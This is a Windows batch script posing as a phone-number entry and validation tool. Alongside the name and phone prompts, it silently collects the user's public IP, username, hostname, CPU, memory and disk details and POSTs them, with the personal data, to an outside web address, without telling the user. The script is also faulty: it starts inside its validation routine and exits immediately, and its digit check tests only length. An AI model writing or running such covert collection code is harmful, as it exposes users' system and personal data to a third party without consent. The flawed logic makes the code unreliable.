@echo off
setlocal enabledelayedexpansion

:: Function to validate phone number
:validate_phone_number
set "phone_number=%~1"
set "valid=0"

:: Check if the phone number starts with 6, 7, 8, 9, or 0
if "!phone_number:~0,1!"=="6" set "valid=1"
if "!phone_number:~0,1!"=="7" set "valid=1"
if "!phone_number:~0,1!"=="8" set "valid=1"
if "!phone_number:~0,1!"=="9" set "valid=1"
if "!phone_number:~0,1!"=="0" set "valid=1"

:: Check if the phone number is numeric and has 10 digits
set "len=0"
for /l %%i in (0,1,9) do (
    if "!phone_number:~%%i,1!"=="" goto check_end
    set /a len+=1
)
:check_end
if "!len!"=="10" (
    exit /b 0  :: Valid
) else (
    exit /b 1  :: Invalid
)

:: Get the public IP address of the user
for /f "delims=" %%i in ('curl -s http://api.ipify.org') do set "USER_IP=%%i"

:: Get OS information
set "OS_INFO=%COMPUTERNAME% %PROCESSOR_IDENTIFIER%"
set "OS_VERSION=%PROCESSOR_ARCHITECTURE%"

:: Get current date and time
for /f "tokens=1-3 delims= " %%a in ('echo %date% %time%') do set "CURRENT_TIME=%%a %%b"

:: Get additional user and system details
set "USERNAME=%USERNAME%"
for /f "tokens=2 delims=:" %%a in ('wmic cpu get Name /format:list ^| find "="') do set "CPU_INFO=%%a"
for /f "tokens=2 delims=:" %%a in ('wmic OS get FreePhysicalMemory /format:list ^| find "="') do set "MEMORY_INFO=%%a MB"
for /f "tokens=2 delims=:" %%a in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace /format:list ^| find "="') do set "DISK_USAGE=%%a bytes"
set "HOSTNAME=%COMPUTERNAME%"
set "NETWORK_INFO="

:: Get user details
set /p NAME="Enter your name: "

:: Validate phone number
:phone_input
set /p PHONE_NUMBER="Enter your phone number (10 digits, starting with 6, 7, 8, 9, or 0): "
call :validate_phone_number "%PHONE_NUMBER%"
if errorlevel 1 (
    echo Invalid phone number. Please enter a valid 10-digit phone number starting with 6, 7, 8, 9, or 0.
    goto phone_input
)

echo Valid phone number.

:: Prepare data for POST request
set "POST_DATA=name=%NAME%&ip_address=%USER_IP%&os_info=%OS_INFO%&os_version=%OS_VERSION%&username=%USERNAME%&cpu_info=%CPU_INFO%&memory_info=%MEMORY_INFO%&disk_usage=%DISK_USAGE%&network_info=%NETWORK_INFO%&hostname=%HOSTNAME%&timestamp=%CURRENT_TIME%&phone_number=%PHONE_NUMBER%"

:: Send the details using curl
curl -X POST -d "!POST_DATA!" "https://gagandevraj.com/dbcall/db1.php"

endlocal
